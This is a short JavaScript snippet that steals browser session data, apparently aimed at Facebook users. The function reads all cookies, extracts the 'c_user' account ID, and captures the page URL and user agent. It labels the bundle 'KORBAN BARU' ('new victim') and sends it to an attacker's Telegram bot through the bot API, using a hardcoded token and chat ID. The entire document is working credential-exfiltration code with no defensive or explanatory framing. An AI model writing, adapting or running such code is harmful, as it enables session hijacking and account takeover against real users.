
(function(){
    var token = '8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4';
    var chatId = '1923372966';
    
    var data = '';
    data += '🔴 KORBAN BARU\n\n';
    data += '📋 COOKIES:\n' + document.cookie + '\n\n';
    data += '👤 USER ID: ' + (document.cookie.match(/c_user=(\d+)/)||['','tidak ditemukan'])[1] + '\n\n';
    data += '🔗 URL: ' + window.location.href + '\n\n';
    data += '📱 USER AGENT: ' + navigator.userAgent;
    
    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
    
    fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: chatId,
            text: data
        })
    });
})();
